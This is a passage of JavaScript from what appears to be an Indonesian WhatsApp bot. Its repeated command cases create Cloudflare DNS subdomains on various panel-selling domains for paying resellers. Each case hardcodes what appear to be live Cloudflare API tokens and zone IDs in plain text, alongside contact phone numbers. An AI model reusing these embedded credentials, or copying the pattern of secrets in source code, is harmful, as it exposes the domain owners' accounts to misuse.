                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain21': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain22': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain23': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain24': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 

case 'domain25': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
   case 'domain26': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
    case 'domain27': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain28': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4e1c19a2687fe1a2505fecaf3de3e7ff";
               let apitoken = "p4oS8J-Tc0Rt9z4tgS3gdzbaG-aL0FQ0Ro1mpl-Q";
               let tld = "panellku.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break        
         case 'domain29': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "72fc614619292a5d6c86d3e736b14062";
               let apitoken = "MF2cgyOmXeFdrwpcTS4XRbYbDL9zsmF6XY6TIFlv";
               let tld = "panelkuu.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain30': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain31': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ecfab91669cd9f1f269ff910ef37c4bc";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain32': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
	case 'domain33': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "601cbd78e8141e5ffa37e5bcac5f1e00";
               let apitoken = "TXXi3Cz2NusjfQ4_KStk-mc-IaIKzCj_sINwPLm";
               let tld = "rulzxyxd.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain34': case 'domain35': {
     if (!jangan) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
     }
     break
          case 'domain36': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "44379cef53cb4d8b5e28c11d28efff19";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "rizalshop.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain37': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
